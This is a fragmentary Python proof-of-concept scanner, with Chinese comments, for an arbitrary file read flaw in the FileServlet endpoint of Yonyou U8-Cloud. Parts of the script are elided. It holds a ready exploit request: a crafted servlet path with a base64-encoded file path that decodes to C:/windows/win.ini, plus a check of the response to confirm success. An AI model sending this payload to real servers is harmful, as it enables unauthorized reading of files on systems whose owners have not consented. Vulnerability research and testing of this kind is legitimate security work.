...
def main():
    ...
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="用友U8-Cloud FileServlet接口存在任意文件读取漏洞")
...
#定义poc
def poc(target):
    payload = '/service/~hrpub/nc.bs.hr.tools.trans.FileServlet?path=QzovL3dpbmRvd3Mvd2luLmluaQ=='
    url = target+payload
    header = {
    ...
    try:
        ...
        if re.status_code == 200 and 'Mail' in re.text:      
